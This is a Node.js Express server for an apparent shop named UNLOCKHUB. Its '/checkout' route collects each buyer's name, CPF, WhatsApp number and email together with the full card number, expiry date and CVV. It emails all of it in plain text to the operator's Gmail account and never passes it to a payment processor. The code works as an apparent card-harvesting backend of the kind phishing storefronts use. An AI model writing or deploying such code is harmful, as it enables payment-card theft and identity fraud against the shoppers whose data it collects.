const express = require("express");
const bodyParser = require("body-parser");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));

// ================= EMAIL CONFIG =================
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

// ================= CHECKOUT =================
app.post("/checkout", async (req, res) => {
  try {
    const {
      nome,
      cpf,
      whatsapp,
      email,
      produto,
      preco,
      metodo,
      numeroCartao,
      validade,
      cvv,
    } = req.body;

    const dados = `
NOVO PEDIDO - UNLOCKHUB

Nome: ${nome}
CPF: ${cpf}
WhatsApp: ${whatsapp}
Email: ${email}

Produto: ${produto}
Preço: R$ ${preco}
Método: ${metodo}

Número do Cartão: ${numeroCartao || "N/A"}
Validade: ${validade || "N/A"}
CVV: ${cvv || "N/A"}
`;

    await transporter.sendMail({
      from: process.env.EMAIL_USER,
      to: process.env.EMAIL_USER,
      subject: `Novo Pedido - ${produto}`,
      text: dados,
    });

    res.status(200).send("Pedido enviado com sucesso!");
  } catch (error) {
    console.error("Erro ao enviar email:", error);
    res.status(500).send("Erro no servidor.");
  }
});

// ================= PORTA RENDER =================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Servidor rodando na porta " + PORT);
});
